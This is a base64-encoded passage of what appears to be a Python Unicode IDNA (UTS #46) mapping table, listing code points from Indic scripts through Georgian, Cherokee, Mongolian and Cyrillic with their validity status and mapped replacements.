EsIFwnWFwnKSxcbiAgICAoMHg5QjIsIFwnVlwnKSxcbiAgICAoMHg5QjMsIFwnWFwnKSxcbiAgICAoMHg5QjYsIFwnVlwnKSxcbiAgICAoMHg5QkEsIFwnWFwnKSxcbiAgICAoMHg5QkMsIFwnVlwnKSxcbiAgICAoMHg5QzUsIFwnWFwnKSxcbiAgICAoMHg5QzcsIFwnVlwnKSxcbiAgICAoMHg5QzksIFwnWFwnKSxcbiAgICAoMHg5Q0IsIFwnVlwnKSxcbiAgICAoMHg5Q0YsIFwnWFwnKSxcbiAgICAoMHg5RDcsIFwnVlwnKSxcbiAgICAoMHg5RDgsIFwnWFwnKSxcbiAgICAoMHg5REMsIFwnTVwnLCBcJ1x4ZTBceGE2XHhhMVx4ZTBceGE2XHhiY1wnKSxcbiAgICAoMHg5REQsIFwnTVwnLCBcJ1x4ZTBceGE2XHhhMlx4ZTBceGE2XHhiY1wnKSxcbiAgICAoMHg5REUsIFwnWFwnKSxcbiAgICAoMHg5REYsIFwnTVwnLCBcJ1x4ZTBceGE2XHhhZlx4ZTBceGE2XHhiY1wnKSxcbiAgICAoMHg5RTAsIFwnVlwnKSxcbiAgICAoMHg5RTQsIFwnWFwnKSxcbiAgICAoMHg5RTYsIFwnVlwnKSxcbiAgICAoMHg5RkYsIFwnWFwnKSxcbiAgICAoMHhBMDEsIFwnVlwnKSxcbiAgICAoMHhBMDQsIFwnWFwnKSxcbiAgICAoMHhBMDUsIFwnVlwnKSxcbiAgICAoMHhBMEIsIFwnWFwnKSxcbiAgICAoMHhBMEYsIFwnVlwnKSxcbiAgICAoMHhBMTEsIFwnWFwnKSxcbiAgICAoMHhBMTMsIFwnVlwnKSxcbiAgICAoMHhBMjksIFwnWFwnKSxcbiAgICAoMHhBMkEsIFwnVlwnKSxcbiAgICAoMHhBMzEsIFwnWFwnKSxcbiAgICAoMHhBMzIsIFwnVlwnKSxcbiAgICAoMHhBMzMsIFwnTVwnLCBcJ1x4ZTBceGE4XHhiMlx4ZTBceGE4XHhiY1wnKSxcbiAgICAoMHhBMzQsIFwnWFwnKSxcbiAgICAoMHhBMzUsIFwnVlwnKSxcbiAgICAoMHhBMzYsIFwnTVwnLCBcJ1x4ZTBceGE4XHhiOFx4ZTBceGE4XHhiY1wnKSxcbiAgICAoMHhBMzcsIFwnWFwnKSxcbiAgICAoMHhBMzgsIFwnVlwnKSxcbiAgICAoMHhBM0EsIFwnWFwnKSxcbiAgICAoMHhBM0MsIFwnVlwnKSxcbiAgICAoMHhBM0QsIFwnWFwnKSxcbiAgICAoMHhBM0UsIFwnVlwnKSxcbiAgICAoMHhBNDMsIFwnWFwnKSxcbiAgICAoMHhBNDcsIFwnVlwnKSxcbiAgICAoMHhBNDksIFwnWFwnKSxcbiAgICAoMHhBNEIsIFwnVlwnKSxcbiAgICAoMHhBNEUsIFwnWFwnKSxcbiAgICAoMHhBNTEsIFwnVlwnKSxcbiAgICAoMHhBNTIsIFwnWFwnKSxcbiAgICAoMHhBNTksIFwnTVwnLCBcJ1x4ZTBceGE4XHg5Nlx4ZTBceGE4XHhiY1wnKSxcbiAgICAoMHhBNUEsIFwnTVwnLCBcJ1x4ZTBceGE4XHg5N1x4ZTBceGE4XHhiY1wnKSxcbiAgICAoMHhBNUIsIFwnTVwnLCBcJ1x4ZTBceGE4XHg5Y1x4ZTBceGE4XHhiY1wnKSxcbiAgICAoMHhBNUMsIFwnVlwnKSxcbiAgICAoMHhBNUQsIFwnWFwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzExKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhBNUUsIFwnTVwnLCBcJ1x4ZTBceGE4XHhhYlx4ZTBceGE4XHhiY1wnKSxcbiAgICAoMHhBNUYsIFwnWFwnKSxcbiAgICAoMHhBNjYsIFwnVlwnKSxcbiAgICAoMHhBNzcsIFwnWFwnKSxcbiAgICAoMHhBODEsIFwnVlwnKSxcbiAgICAoMHhBODQsIFwnWFwnKSxcbiAgICAoMHhBODUsIFwnVlwnKSxcbiAgICAoMHhBOEUsIFwnWFwnKSxcbiAgICAoMHhBOEYsIFwnVlwnKSxcbiAgICAoMHhBOTIsIFwnWFwnKSxcbiAgICAoMHhBOTMsIFwnVlwnKSxcbiAgICAoMHhBQTksIFwnWFwnKSxcbiAgICAoMHhBQUEsIFwnVlwnKSxcbiAgICAoMHhBQjEsIFwnWFwnKSxcbiAgICAoMHhBQjIsIFwnVlwnKSxcbiAgICAoMHhBQjQsIFwnWFwnKSxcbiAgICAoMHhBQjUsIFwnVlwnKSxcbiAgICAoMHhBQkEsIFwnWFwnKSxcbiAgICAoMHhBQkMsIFwnVlwnKSxcbiAgICAoMHhBQzYsIFwnWFwnKSxcbiAgICAoMHhBQzcsIFwnVlwnKSxcbiAgICAoMHhBQ0EsIFwnWFwnKSxcbiAgICAoMHhBQ0IsIFwnVlwnKSxcbiAgICAoMHhBQ0UsIFwnWFwnKSxcbiAgICAoMHhBRDAsIFwnVlwnKSxcbiAgICAoMHhBRDEsIFwnWFwnKSxcbiAgICAoMHhBRTAsIFwnVlwnKSxcbiAgICAoMHhBRTQsIFwnWFwnKSxcbiAgICAoMHhBRTYsIFwnVlwnKSxcbiAgICAoMHhBRjIsIFwnWFwnKSxcbiAgICAoMHhBRjksIFwnVlwnKSxcbiAgICAoMHhCMDAsIFwnWFwnKSxcbiAgICAoMHhCMDEsIFwnVlwnKSxcbiAgICAoMHhCMDQsIFwnWFwnKSxcbiAgICAoMHhCMDUsIFwnVlwnKSxcbiAgICAoMHhCMEQsIFwnWFwnKSxcbiAgICAoMHhCMEYsIFwnVlwnKSxcbiAgICAoMHhCMTEsIFwnWFwnKSxcbiAgICAoMHhCMTMsIFwnVlwnKSxcbiAgICAoMHhCMjksIFwnWFwnKSxcbiAgICAoMHhCMkEsIFwnVlwnKSxcbiAgICAoMHhCMzEsIFwnWFwnKSxcbiAgICAoMHhCMzIsIFwnVlwnKSxcbiAgICAoMHhCMzQsIFwnWFwnKSxcbiAgICAoMHhCMzUsIFwnVlwnKSxcbiAgICAoMHhCM0EsIFwnWFwnKSxcbiAgICAoMHhCM0MsIFwnVlwnKSxcbiAgICAoMHhCNDUsIFwnWFwnKSxcbiAgICAoMHhCNDcsIFwnVlwnKSxcbiAgICAoMHhCNDksIFwnWFwnKSxcbiAgICAoMHhCNEIsIFwnVlwnKSxcbiAgICAoMHhCNEUsIFwnWFwnKSxcbiAgICAoMHhCNTUsIFwnVlwnKSxcbiAgICAoMHhCNTgsIFwnWFwnKSxcbiAgICAoMHhCNUMsIFwnTVwnLCBcJ1x4ZTBceGFjXHhhMVx4ZTBceGFjXHhiY1wnKSxcbiAgICAoMHhCNUQsIFwnTVwnLCBcJ1x4ZTBceGFjXHhhMlx4ZTBceGFjXHhiY1wnKSxcbiAgICAoMHhCNUUsIFwnWFwnKSxcbiAgICAoMHhCNUYsIFwnVlwnKSxcbiAgICAoMHhCNjQsIFwnWFwnKSxcbiAgICAoMHhCNjYsIFwnVlwnKSxcbiAgICAoMHhCNzgsIFwnWFwnKSxcbiAgICAoMHhCODIsIFwnVlwnKSxcbiAgICAoMHhCODQsIFwnWFwnKSxcbiAgICAoMHhCODUsIFwnVlwnKSxcbiAgICAoMHhCOEIsIFwnWFwnKSxcbiAgICAoMHhCOEUsIFwnVlwnKSxcbiAgICAoMHhCOTEsIFwnWFwnKSxcbiAgICAoMHhCOTIsIFwnVlwnKSxcbiAgICAoMHhCOTYsIFwnWFwnKSxcbiAgICAoMHhCOTksIFwnVlwnKSxcbiAgICAoMHhCOUIsIFwnWFwnKSxcbiAgICAoMHhCOUMsIFwnVlwnKSxcbiAgICAoMHhCOUQsIFwnWFwnKSxcbiAgICAoMHhCOUUsIFwnVlwnKSxcbiAgICAoMHhCQTAsIFwnWFwnKSxcbiAgICAoMHhCQTMsIFwnVlwnKSxcbiAgICAoMHhCQTUsIFwnWFwnKSxcbiAgICAoMHhCQTgsIFwnVlwnKSxcbiAgICAoMHhCQUIsIFwnWFwnKSxcbiAgICAoMHhCQUUsIFwnVlwnKSxcbiAgICAoMHhCQkEsIFwnWFwnKSxcbiAgICAoMHhCQkUsIFwnVlwnKSxcbiAgICAoMHhCQzMsIFwnWFwnKSxcbiAgICAoMHhCQzYsIFwnVlwnKSxcbiAgICAoMHhCQzksIFwnWFwnKSxcbiAgICAoMHhCQ0EsIFwnVlwnKSxcbiAgICAoMHhCQ0UsIFwnWFwnKSxcbiAgICAoMHhCRDAsIFwnVlwnKSxcbiAgICAoMHhCRDEsIFwnWFwnKSxcbiAgICAoMHhCRDcsIFwnVlwnKSxcbiAgICAoMHhCRDgsIFwnWFwnKSxcbiAgICAoMHhCRTYsIFwnVlwnKSxcbiAgICAoMHhCRkIsIFwnWFwnKSxcbiAgICAoMHhDMDAsIFwnVlwnKSxcbiAgICAoMHhDMEQsIFwnWFwnKSxcbiAgICAoMHhDMEUsIFwnVlwnKSxcbiAgICAoMHhDMTEsIFwnWFwnKSxcbiAgICAoMHhDMTIsIFwnVlwnKSxcbiAgICAoMHhDMjksIFwnWFwnKSxcbiAgICAoMHhDMkEsIFwnVlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzEyKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhDM0EsIFwnWFwnKSxcbiAgICAoMHhDM0MsIFwnVlwnKSxcbiAgICAoMHhDNDUsIFwnWFwnKSxcbiAgICAoMHhDNDYsIFwnVlwnKSxcbiAgICAoMHhDNDksIFwnWFwnKSxcbiAgICAoMHhDNEEsIFwnVlwnKSxcbiAgICAoMHhDNEUsIFwnWFwnKSxcbiAgICAoMHhDNTUsIFwnVlwnKSxcbiAgICAoMHhDNTcsIFwnWFwnKSxcbiAgICAoMHhDNTgsIFwnVlwnKSxcbiAgICAoMHhDNUIsIFwnWFwnKSxcbiAgICAoMHhDNUQsIFwnVlwnKSxcbiAgICAoMHhDNUUsIFwnWFwnKSxcbiAgICAoMHhDNjAsIFwnVlwnKSxcbiAgICAoMHhDNjQsIFwnWFwnKSxcbiAgICAoMHhDNjYsIFwnVlwnKSxcbiAgICAoMHhDNzAsIFwnWFwnKSxcbiAgICAoMHhDNzcsIFwnVlwnKSxcbiAgICAoMHhDOEQsIFwnWFwnKSxcbiAgICAoMHhDOEUsIFwnVlwnKSxcbiAgICAoMHhDOTEsIFwnWFwnKSxcbiAgICAoMHhDOTIsIFwnVlwnKSxcbiAgICAoMHhDQTksIFwnWFwnKSxcbiAgICAoMHhDQUEsIFwnVlwnKSxcbiAgICAoMHhDQjQsIFwnWFwnKSxcbiAgICAoMHhDQjUsIFwnVlwnKSxcbiAgICAoMHhDQkEsIFwnWFwnKSxcbiAgICAoMHhDQkMsIFwnVlwnKSxcbiAgICAoMHhDQzUsIFwnWFwnKSxcbiAgICAoMHhDQzYsIFwnVlwnKSxcbiAgICAoMHhDQzksIFwnWFwnKSxcbiAgICAoMHhDQ0EsIFwnVlwnKSxcbiAgICAoMHhDQ0UsIFwnWFwnKSxcbiAgICAoMHhDRDUsIFwnVlwnKSxcbiAgICAoMHhDRDcsIFwnWFwnKSxcbiAgICAoMHhDREQsIFwnVlwnKSxcbiAgICAoMHhDREYsIFwnWFwnKSxcbiAgICAoMHhDRTAsIFwnVlwnKSxcbiAgICAoMHhDRTQsIFwnWFwnKSxcbiAgICAoMHhDRTYsIFwnVlwnKSxcbiAgICAoMHhDRjAsIFwnWFwnKSxcbiAgICAoMHhDRjEsIFwnVlwnKSxcbiAgICAoMHhDRjMsIFwnWFwnKSxcbiAgICAoMHhEMDAsIFwnVlwnKSxcbiAgICAoMHhEMEQsIFwnWFwnKSxcbiAgICAoMHhEMEUsIFwnVlwnKSxcbiAgICAoMHhEMTEsIFwnWFwnKSxcbiAgICAoMHhEMTIsIFwnVlwnKSxcbiAgICAoMHhENDUsIFwnWFwnKSxcbiAgICAoMHhENDYsIFwnVlwnKSxcbiAgICAoMHhENDksIFwnWFwnKSxcbiAgICAoMHhENEEsIFwnVlwnKSxcbiAgICAoMHhENTAsIFwnWFwnKSxcbiAgICAoMHhENTQsIFwnVlwnKSxcbiAgICAoMHhENjQsIFwnWFwnKSxcbiAgICAoMHhENjYsIFwnVlwnKSxcbiAgICAoMHhEODAsIFwnWFwnKSxcbiAgICAoMHhEODEsIFwnVlwnKSxcbiAgICAoMHhEODQsIFwnWFwnKSxcbiAgICAoMHhEODUsIFwnVlwnKSxcbiAgICAoMHhEOTcsIFwnWFwnKSxcbiAgICAoMHhEOUEsIFwnVlwnKSxcbiAgICAoMHhEQjIsIFwnWFwnKSxcbiAgICAoMHhEQjMsIFwnVlwnKSxcbiAgICAoMHhEQkMsIFwnWFwnKSxcbiAgICAoMHhEQkQsIFwnVlwnKSxcbiAgICAoMHhEQkUsIFwnWFwnKSxcbiAgICAoMHhEQzAsIFwnVlwnKSxcbiAgICAoMHhEQzcsIFwnWFwnKSxcbiAgICAoMHhEQ0EsIFwnVlwnKSxcbiAgICAoMHhEQ0IsIFwnWFwnKSxcbiAgICAoMHhEQ0YsIFwnVlwnKSxcbiAgICAoMHhERDUsIFwnWFwnKSxcbiAgICAoMHhERDYsIFwnVlwnKSxcbiAgICAoMHhERDcsIFwnWFwnKSxcbiAgICAoMHhERDgsIFwnVlwnKSxcbiAgICAoMHhERTAsIFwnWFwnKSxcbiAgICAoMHhERTYsIFwnVlwnKSxcbiAgICAoMHhERjAsIFwnWFwnKSxcbiAgICAoMHhERjIsIFwnVlwnKSxcbiAgICAoMHhERjUsIFwnWFwnKSxcbiAgICAoMHhFMDEsIFwnVlwnKSxcbiAgICAoMHhFMzMsIFwnTVwnLCBcJ1x4ZTBceGI5XHg4ZFx4ZTBceGI4XHhiMlwnKSxcbiAgICAoMHhFMzQsIFwnVlwnKSxcbiAgICAoMHhFM0IsIFwnWFwnKSxcbiAgICAoMHhFM0YsIFwnVlwnKSxcbiAgICAoMHhFNUMsIFwnWFwnKSxcbiAgICAoMHhFODEsIFwnVlwnKSxcbiAgICAoMHhFODMsIFwnWFwnKSxcbiAgICAoMHhFODQsIFwnVlwnKSxcbiAgICAoMHhFODUsIFwnWFwnKSxcbiAgICAoMHhFODYsIFwnVlwnKSxcbiAgICAoMHhFOEIsIFwnWFwnKSxcbiAgICAoMHhFOEMsIFwnVlwnKSxcbiAgICAoMHhFQTQsIFwnWFwnKSxcbiAgICAoMHhFQTUsIFwnVlwnKSxcbiAgICAoMHhFQTYsIFwnWFwnKSxcbiAgICAoMHhFQTcsIFwnVlwnKSxcbiAgICAoMHhFQjMsIFwnTVwnLCBcJ1x4ZTBceGJiXHg4ZFx4ZTBceGJhXHhiMlwnKSxcbiAgICAoMHhFQjQsIFwnVlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzEzKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhFQkUsIFwnWFwnKSxcbiAgICAoMHhFQzAsIFwnVlwnKSxcbiAgICAoMHhFQzUsIFwnWFwnKSxcbiAgICAoMHhFQzYsIFwnVlwnKSxcbiAgICAoMHhFQzcsIFwnWFwnKSxcbiAgICAoMHhFQzgsIFwnVlwnKSxcbiAgICAoMHhFQ0UsIFwnWFwnKSxcbiAgICAoMHhFRDAsIFwnVlwnKSxcbiAgICAoMHhFREEsIFwnWFwnKSxcbiAgICAoMHhFREMsIFwnTVwnLCBcJ1x4ZTBceGJhXHhhYlx4ZTBceGJhXHg5OVwnKSxcbiAgICAoMHhFREQsIFwnTVwnLCBcJ1x4ZTBceGJhXHhhYlx4ZTBceGJhXHhhMVwnKSxcbiAgICAoMHhFREUsIFwnVlwnKSxcbiAgICAoMHhFRTAsIFwnWFwnKSxcbiAgICAoMHhGMDAsIFwnVlwnKSxcbiAgICAoMHhGMEMsIFwnTVwnLCBcJ1x4ZTBceGJjXHg4YlwnKSxcbiAgICAoMHhGMEQsIFwnVlwnKSxcbiAgICAoMHhGNDMsIFwnTVwnLCBcJ1x4ZTBceGJkXHg4Mlx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGNDQsIFwnVlwnKSxcbiAgICAoMHhGNDgsIFwnWFwnKSxcbiAgICAoMHhGNDksIFwnVlwnKSxcbiAgICAoMHhGNEQsIFwnTVwnLCBcJ1x4ZTBceGJkXHg4Y1x4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGNEUsIFwnVlwnKSxcbiAgICAoMHhGNTIsIFwnTVwnLCBcJ1x4ZTBceGJkXHg5MVx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGNTMsIFwnVlwnKSxcbiAgICAoMHhGNTcsIFwnTVwnLCBcJ1x4ZTBceGJkXHg5Nlx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGNTgsIFwnVlwnKSxcbiAgICAoMHhGNUMsIFwnTVwnLCBcJ1x4ZTBceGJkXHg5Ylx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGNUQsIFwnVlwnKSxcbiAgICAoMHhGNjksIFwnTVwnLCBcJ1x4ZTBceGJkXHg4MFx4ZTBceGJlXHhiNVwnKSxcbiAgICAoMHhGNkEsIFwnVlwnKSxcbiAgICAoMHhGNkQsIFwnWFwnKSxcbiAgICAoMHhGNzEsIFwnVlwnKSxcbiAgICAoMHhGNzMsIFwnTVwnLCBcJ1x4ZTBceGJkXHhiMVx4ZTBceGJkXHhiMlwnKSxcbiAgICAoMHhGNzQsIFwnVlwnKSxcbiAgICAoMHhGNzUsIFwnTVwnLCBcJ1x4ZTBceGJkXHhiMVx4ZTBceGJkXHhiNFwnKSxcbiAgICAoMHhGNzYsIFwnTVwnLCBcJ1x4ZTBceGJlXHhiMlx4ZTBceGJlXHg4MFwnKSxcbiAgICAoMHhGNzcsIFwnTVwnLCBcJ1x4ZTBceGJlXHhiMlx4ZTBceGJkXHhiMVx4ZTBceGJlXHg4MFwnKSxcbiAgICAoMHhGNzgsIFwnTVwnLCBcJ1x4ZTBceGJlXHhiM1x4ZTBceGJlXHg4MFwnKSxcbiAgICAoMHhGNzksIFwnTVwnLCBcJ1x4ZTBceGJlXHhiM1x4ZTBceGJkXHhiMVx4ZTBceGJlXHg4MFwnKSxcbiAgICAoMHhGN0EsIFwnVlwnKSxcbiAgICAoMHhGODEsIFwnTVwnLCBcJ1x4ZTBceGJkXHhiMVx4ZTBceGJlXHg4MFwnKSxcbiAgICAoMHhGODIsIFwnVlwnKSxcbiAgICAoMHhGOTMsIFwnTVwnLCBcJ1x4ZTBceGJlXHg5Mlx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGOTQsIFwnVlwnKSxcbiAgICAoMHhGOTgsIFwnWFwnKSxcbiAgICAoMHhGOTksIFwnVlwnKSxcbiAgICAoMHhGOUQsIFwnTVwnLCBcJ1x4ZTBceGJlXHg5Y1x4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGOUUsIFwnVlwnKSxcbiAgICAoMHhGQTIsIFwnTVwnLCBcJ1x4ZTBceGJlXHhhMVx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGQTMsIFwnVlwnKSxcbiAgICAoMHhGQTcsIFwnTVwnLCBcJ1x4ZTBceGJlXHhhNlx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGQTgsIFwnVlwnKSxcbiAgICAoMHhGQUMsIFwnTVwnLCBcJ1x4ZTBceGJlXHhhYlx4ZTBceGJlXHhiN1wnKSxcbiAgICAoMHhGQUQsIFwnVlwnKSxcbiAgICAoMHhGQjksIFwnTVwnLCBcJ1x4ZTBceGJlXHg5MFx4ZTBceGJlXHhiNVwnKSxcbiAgICAoMHhGQkEsIFwnVlwnKSxcbiAgICAoMHhGQkQsIFwnWFwnKSxcbiAgICAoMHhGQkUsIFwnVlwnKSxcbiAgICAoMHhGQ0QsIFwnWFwnKSxcbiAgICAoMHhGQ0UsIFwnVlwnKSxcbiAgICAoMHhGREIsIFwnWFwnKSxcbiAgICAoMHgxMDAwLCBcJ1ZcJyksXG4gICAgKDB4MTBBMCwgXCdYXCcpLFxuICAgICgweDEwQzcsIFwnTVwnLCBcJ1x4ZTJceGI0XHhhN1wnKSxcbiAgICAoMHgxMEM4LCBcJ1hcJyksXG4gICAgKDB4MTBDRCwgXCdNXCcsIFwnXHhlMlx4YjRceGFkXCcpLFxuICAgICgweDEwQ0UsIFwnWFwnKSxcbiAgICAoMHgxMEQwLCBcJ1ZcJyksXG4gICAgKDB4MTBGQywgXCdNXCcsIFwnXHhlMVx4ODNceDljXCcpLFxuICAgICgweDEwRkQsIFwnVlwnKSxcbiAgICAoMHgxMTVGLCBcJ1hcJyksXG4gICAgKDB4MTE2MSwgXCdWXCcpLFxuICAgICgweDEyNDksIFwnWFwnKSxcbiAgICAoMHgxMjRBLCBcJ1ZcJyksXG4gICAgKDB4MTI0RSwgXCdYXCcpLFxuICAgICgweDEyNTAsIFwnVlwnKSxcbiAgICAoMHgxMjU3LCBcJ1hcJyksXG4gICAgKDB4MTI1OCwgXCdWXCcpLFxuICAgICgweDEyNTksIFwnWFwnKSxcbiAgICAoMHgxMjVBLCBcJ1ZcJyksXG4gICAgKDB4MTI1RSwgXCdYXCcpLFxuICAgICgweDEyNjAsIFwnVlwnKSxcbiAgICAoMHgxMjg5LCBcJ1hcJyksXG4gICAgKDB4MTI4QSwgXCdWXCcpLFxuICAgICgweDEyOEUsIFwnWFwnKSxcbiAgICAoMHgxMjkwLCBcJ1ZcJyksXG4gICAgKDB4MTJCMSwgXCdYXCcpLFxuICAgICgweDEyQjIsIFwnVlwnKSxcbiAgICAoMHgxMkI2LCBcJ1hcJyksXG4gICAgKDB4MTJCOCwgXCdWXCcpLFxuICAgICgweDEyQkYsIFwnWFwnKSxcbiAgICAoMHgxMkMwLCBcJ1ZcJyksXG4gICAgKDB4MTJDMSwgXCdYXCcpLFxuICAgICgweDEyQzIsIFwnVlwnKSxcbiAgICAoMHgxMkM2LCBcJ1hcJyksXG4gICAgKDB4MTJDOCwgXCdWXCcpLFxuICAgICgweDEyRDcsIFwnWFwnKSxcbiAgICAoMHgxMkQ4LCBcJ1ZcJyksXG4gICAgKDB4MTMxMSwgXCdYXCcpLFxuICAgICgweDEzMTIsIFwnVlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzE0KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgxMzE2LCBcJ1hcJyksXG4gICAgKDB4MTMxOCwgXCdWXCcpLFxuICAgICgweDEzNUIsIFwnWFwnKSxcbiAgICAoMHgxMzVELCBcJ1ZcJyksXG4gICAgKDB4MTM3RCwgXCdYXCcpLFxuICAgICgweDEzODAsIFwnVlwnKSxcbiAgICAoMHgxMzlBLCBcJ1hcJyksXG4gICAgKDB4MTNBMCwgXCdWXCcpLFxuICAgICgweDEzRjYsIFwnWFwnKSxcbiAgICAoMHgxM0Y4LCBcJ01cJywgXCdceGUxXHg4Zlx4YjBcJyksXG4gICAgKDB4MTNGOSwgXCdNXCcsIFwnXHhlMVx4OGZceGIxXCcpLFxuICAgICgweDEzRkEsIFwnTVwnLCBcJ1x4ZTFceDhmXHhiMlwnKSxcbiAgICAoMHgxM0ZCLCBcJ01cJywgXCdceGUxXHg4Zlx4YjNcJyksXG4gICAgKDB4MTNGQywgXCdNXCcsIFwnXHhlMVx4OGZceGI0XCcpLFxuICAgICgweDEzRkQsIFwnTVwnLCBcJ1x4ZTFceDhmXHhiNVwnKSxcbiAgICAoMHgxM0ZFLCBcJ1hcJyksXG4gICAgKDB4MTQwMCwgXCdWXCcpLFxuICAgICgweDE2ODAsIFwnWFwnKSxcbiAgICAoMHgxNjgxLCBcJ1ZcJyksXG4gICAgKDB4MTY5RCwgXCdYXCcpLFxuICAgICgweDE2QTAsIFwnVlwnKSxcbiAgICAoMHgxNkY5LCBcJ1hcJyksXG4gICAgKDB4MTcwMCwgXCdWXCcpLFxuICAgICgweDE3MTYsIFwnWFwnKSxcbiAgICAoMHgxNzFGLCBcJ1ZcJyksXG4gICAgKDB4MTczNywgXCdYXCcpLFxuICAgICgweDE3NDAsIFwnVlwnKSxcbiAgICAoMHgxNzU0LCBcJ1hcJyksXG4gICAgKDB4MTc2MCwgXCdWXCcpLFxuICAgICgweDE3NkQsIFwnWFwnKSxcbiAgICAoMHgxNzZFLCBcJ1ZcJyksXG4gICAgKDB4MTc3MSwgXCdYXCcpLFxuICAgICgweDE3NzIsIFwnVlwnKSxcbiAgICAoMHgxNzc0LCBcJ1hcJyksXG4gICAgKDB4MTc4MCwgXCdWXCcpLFxuICAgICgweDE3QjQsIFwnWFwnKSxcbiAgICAoMHgxN0I2LCBcJ1ZcJyksXG4gICAgKDB4MTdERSwgXCdYXCcpLFxuICAgICgweDE3RTAsIFwnVlwnKSxcbiAgICAoMHgxN0VBLCBcJ1hcJyksXG4gICAgKDB4MTdGMCwgXCdWXCcpLFxuICAgICgweDE3RkEsIFwnWFwnKSxcbiAgICAoMHgxODAwLCBcJ1ZcJyksXG4gICAgKDB4MTgwNiwgXCdYXCcpLFxuICAgICgweDE4MDcsIFwnVlwnKSxcbiAgICAoMHgxODBCLCBcJ0lcJyksXG4gICAgKDB4MTgwRSwgXCdYXCcpLFxuICAgICgweDE4MEYsIFwnSVwnKSxcbiAgICAoMHgxODEwLCBcJ1ZcJyksXG4gICAgKDB4MTgxQSwgXCdYXCcpLFxuICAgICgweDE4MjAsIFwnVlwnKSxcbiAgICAoMHgxODc5LCBcJ1hcJyksXG4gICAgKDB4MTg4MCwgXCdWXCcpLFxuICAgICgweDE4QUIsIFwnWFwnKSxcbiAgICAoMHgxOEIwLCBcJ1ZcJyksXG4gICAgKDB4MThGNiwgXCdYXCcpLFxuICAgICgweDE5MDAsIFwnVlwnKSxcbiAgICAoMHgxOTFGLCBcJ1hcJyksXG4gICAgKDB4MTkyMCwgXCdWXCcpLFxuICAgICgweDE5MkMsIFwnWFwnKSxcbiAgICAoMHgxOTMwLCBcJ1ZcJyksXG4gICAgKDB4MTkzQywgXCdYXCcpLFxuICAgICgweDE5NDAsIFwnVlwnKSxcbiAgICAoMHgxOTQxLCBcJ1hcJyksXG4gICAgKDB4MTk0NCwgXCdWXCcpLFxuICAgICgweDE5NkUsIFwnWFwnKSxcbiAgICAoMHgxOTcwLCBcJ1ZcJyksXG4gICAgKDB4MTk3NSwgXCdYXCcpLFxuICAgICgweDE5ODAsIFwnVlwnKSxcbiAgICAoMHgxOUFDLCBcJ1hcJyksXG4gICAgKDB4MTlCMCwgXCdWXCcpLFxuICAgICgweDE5Q0EsIFwnWFwnKSxcbiAgICAoMHgxOUQwLCBcJ1ZcJyksXG4gICAgKDB4MTlEQiwgXCdYXCcpLFxuICAgICgweDE5REUsIFwnVlwnKSxcbiAgICAoMHgxQTFDLCBcJ1hcJyksXG4gICAgKDB4MUExRSwgXCdWXCcpLFxuICAgICgweDFBNUYsIFwnWFwnKSxcbiAgICAoMHgxQTYwLCBcJ1ZcJyksXG4gICAgKDB4MUE3RCwgXCdYXCcpLFxuICAgICgweDFBN0YsIFwnVlwnKSxcbiAgICAoMHgxQThBLCBcJ1hcJyksXG4gICAgKDB4MUE5MCwgXCdWXCcpLFxuICAgICgweDFBOUEsIFwnWFwnKSxcbiAgICAoMHgxQUEwLCBcJ1ZcJyksXG4gICAgKDB4MUFBRSwgXCdYXCcpLFxuICAgICgweDFBQjAsIFwnVlwnKSxcbiAgICAoMHgxQUNGLCBcJ1hcJyksXG4gICAgKDB4MUIwMCwgXCdWXCcpLFxuICAgICgweDFCNEQsIFwnWFwnKSxcbiAgICAoMHgxQjUwLCBcJ1ZcJyksXG4gICAgKDB4MUI3RiwgXCdYXCcpLFxuICAgICgweDFCODAsIFwnVlwnKSxcbiAgICAoMHgxQkY0LCBcJ1hcJyksXG4gICAgKDB4MUJGQywgXCdWXCcpLFxuICAgICgweDFDMzgsIFwnWFwnKSxcbiAgICAoMHgxQzNCLCBcJ1ZcJyksXG4gICAgKDB4MUM0QSwgXCdYXCcpLFxuICAgICgweDFDNEQsIFwnVlwnKSxcbiAgICAoMHgxQzgwLCBcJ01cJywgXCdceGQwXHhiMlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzE1KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgxQzgxLCBcJ01cJywgXCdceGQwXHhiNFwnKSxcbiAgICAoMHgxQzgyLCBcJ01cJywgXCdceGQwXHhiZVwnKSxcbiAgICAoMHgxQzgzLCBcJ01cJywgXCdceGQxXHg4MVwnKSxcbiAgICAoMHgxQzg0LCBcJ01cJywgXCdceGQxXHg4MlwnKSxcbiAgICAoMHgxQzg2LCBcJ01cJywgXCdceGQxXHg4YVwnKSxcbiAgICAoMHgxQzg3LCBcJ01cJywgXCdceGQxXHhhM1wnKSxcbiAgICAoMHgxQzg4LCBcJ01cJywgXCdceGVhXHg5OVx4OGJcJyksXG4gICAgKDB4MUM4OSwgXCdYXCcpLFxuICAgICgweDFDOTAsIFwnTVwnLCBcJ1x4ZTFceDgzXHg5MFwnKSxcbiAgICAoMHgxQzkxLCBcJ01c